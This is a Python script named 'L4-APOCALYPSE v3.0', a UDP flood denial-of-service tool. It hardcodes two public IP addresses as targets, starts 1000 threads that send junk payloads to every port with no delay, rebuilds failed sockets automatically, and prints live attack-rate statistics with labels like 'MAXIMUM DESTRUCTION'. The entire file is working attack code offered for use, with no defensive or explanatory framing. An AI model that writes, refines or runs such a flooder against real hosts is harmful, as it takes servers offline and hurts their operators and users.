import socket
import threading
import time
import random

# ==================== TARGETS ====================
TARGETS = [
    "62.109.121.43",  # Target 1
    "62.52.52.26",    # Target 2
]

# ==================== PURE L4 NUKE PAYLOADS ====================
class L4Nuker:
    # RAW L4 DESTRUCTION PAYLOADS (NO L7 BULLSHIT)
    NUKE_PAYLOADS = [
        # 1. MAX UDP NUKE (1472 bytes - maximum without fragmentation)
        b'\xFF' * 1472,
        
        # 2. MIN UDP NUKE (28 bytes - minimum IP+UDP)
        b'\x00' * 28,
        
        # 3. RANDOM NUKE (random bytes, random size)
        lambda: random.randbytes(random.randint(28, 1472)),
        
        # 4. PATTERN NUKE (010101)
        b'\x55' * 1024,
        
        # 5. INVERSE PATTERN NUKE (101010)
        b'\xAA' * 1024,
        
        # 6. FULL ZERO NUKE
        b'\x00' * 512,
        
        # 7. FULL ONE NUKE  
        b'\xFF' * 512,
        
        # 8. ALT PATTERN NUKE
        b'\xCC' * 768,
        
        # 9. MIXED NUKE
        b'\xF0' * 256 + b'\x0F' * 256,
        
        # 10. RAPID NUKE (small for max PPS)
        b'\x01' * 64,
    ]
    
    @staticmethod
    def get_nuke():
        """Get raw L4 nuke payload"""
        payload = random.choice(L4Nuker.NUKE_PAYLOADS)
        if callable(payload):
            return payload()
        return payload

# ==================== POWER ENGINE - NO LAG, MAX SEND ====================
class PowerEngine:
    def __init__(self):
        self.stats = {target: {"packets": 0, "bytes": 0} for target in TARGETS}
        self.stats_lock = threading.Lock()
        self.running = True
        
    def nuke_worker(self, target, worker_id):
        """RAW L4 NUKE WORKER - MAXIMUM SENDING"""
        # Create socket ONCE and REUSE (no overhead)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)  # Max buffer
        
        # Target port (FULL RANGE for max damage)
        port_range = list(range(1, 65536))
        random.shuffle(port_range)
        port_idx = 0
        
        while self.running:
            try:
                # Get raw L4 nuke
                payload = L4Nuker.get_nuke()
                
                # Get port (cycle through all 65535)
                port = port_range[port_idx]
                port_idx = (port_idx + 1) % 65535
                
                # NUKE SEND (NO DELAY, NO SLEEP, PURE SPAM)
                sock.sendto(payload, (target, port))
                
                # Update stats (LOCK-FREE FAST PATH)
                with self.stats_lock:
                    self.stats[target]["packets"] += 1
                    self.stats[target]["bytes"] += len(payload)
                    
            except Exception as e:
                # If socket dies, recreate INSTANTLY
                try:
                    sock.close()
                except:
                    pass
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)

# ==================== 1000 THREAD LAUNCHER ====================
def launch_nukes():
    print("╔══════════════════════════════════════════════════════════╗")
    print("║                L4-APOCALYPSE v3.0                        ║")
    print("║            PURE L4 DESTRUCTION ENGINE                    ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"🎯 TARGETS: {len(TARGETS)}")
    print(f"☢️  THREADS: 1000 TOTAL (500 PER TARGET)")
    print(f"💀 PAYLOADS: RAW L4 - NO L7 BULLSHIT")
    print(f"⚡ MODE: MAXIMUM SEND - ZERO DELAY")
    print("═" * 60)
    
    engine = PowerEngine()
    
    # LAUNCH 500 THREADS PER TARGET (1000 TOTAL)
    for target in TARGETS:
        print(f"🚀 DEPLOYING 500 NUKE THREADS TO: {target}")
        for i in range(500):
            t = threading.Thread(target=engine.nuke_worker, args=(target, i))
            t.daemon = True
            t.start()
    
    return engine

# ==================== MAIN EXECUTION ====================
engine = launch_nukes()
print("✅ 1000 NUKE THREADS DEPLOYED")
print("☢️  L4 APOCALYPSE ACTIVE")
print("═" * 60)

# ==================== RAW POWER MONITOR ====================
last_log = time.time()

while True:
    time.sleep(2)  # Check every 2 seconds
    
    current = time.time()
    elapsed = current - last_log
    last_log = current
    
    with engine.stats_lock:
        print(f"\n⏱️  UPDATE: {time.strftime('%H:%M:%S')}")
        print("─" * 50)
        
        total_pps = 0
        total_mbps = 0
        
        for target in TARGETS:
            packets = engine.stats[target]["packets"]
            bytes_sent = engine.stats[target]["bytes"]
            
            # Calculate rates
            pps = int(packets / elapsed) if elapsed > 0 else 0
            mbps = (bytes_sent * 8) / (elapsed * 1000000) if elapsed > 0 else 0
            
            total_pps += pps
            total_mbps += mbps
            
            # Display target stats
            if pps > 50000:
                status = "🔥 MAXIMUM DESTRUCTION"
            elif pps > 25000:
                status = "⚡ HIGH INTENSITY"
            elif pps > 10000:
                status = "💥 MODERATE FORCE"
            else:
                status = "⚠️  INITIALIZING"
            
            print(f"🎯 {target}")
            print(f"   📦 {pps:,} PPS")
            print(f"   📊 {mbps:.1f} Mbps")
            print(f"   ⚡ {status}")
            
            # Reset counters
            engine.stats[target]["packets"] = 0
            engine.stats[target]["bytes"] = 0
        
        # GLOBAL TOTALS
        print("─" * 50)
        print(f"🌐 GLOBAL TOTALS:")
        print(f"   📦 {total_pps:,} PPS TOTAL")
        print(f"   📊 {total_mbps:.1f} Mbps TOTAL")
        
        # POWER LEVEL INDICATOR
        power_level = min(100, total_pps / 1000)
        bar = "█" * int(power_level / 5) + "░" * (20 - int(power_level / 5))
        print(f"   ⚡ POWER: [{bar}] {power_level:.0f}%")
        
        if total_pps > 100000:
            print("   🚨 CRITICAL OVERLOAD DETECTED")
        elif total_pps > 50000:
            print("   ⚠️  HIGH INTENSITY ATTACK ACTIVE")

# ==================== CLEANUP (if needed) ====================
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    engine.running = False
    print("\n⚠️  L4 APOCALYPSE TERMINATED")
